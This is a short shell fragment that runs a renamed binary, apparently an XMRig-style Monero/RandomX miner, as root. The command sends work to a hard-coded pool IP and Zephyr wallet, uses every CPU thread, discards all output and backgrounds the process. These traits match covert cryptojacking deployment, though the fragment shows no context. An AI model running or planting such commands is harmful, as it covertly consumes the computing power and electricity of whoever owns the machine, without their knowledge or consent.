...
chmod +x sgr1
sudo ./sgr1 -o 206.189.148.37:80 -u ZEPHYR39FtS9jDrhDaMM9ReUUPLodNvqYHjD5CbYeLZM8h3tXARpwevMnW3kiXqxUUTYMTSDEgVDDV6WwXYL3Q5TVcVWxN58Wuc59.5000 -p $(echo $(shuf -i 1-20000 -n 1)-naon) -k -a rx/0 -t $(nproc --all) --donate-level 1 > /dev/null 2>&1 &
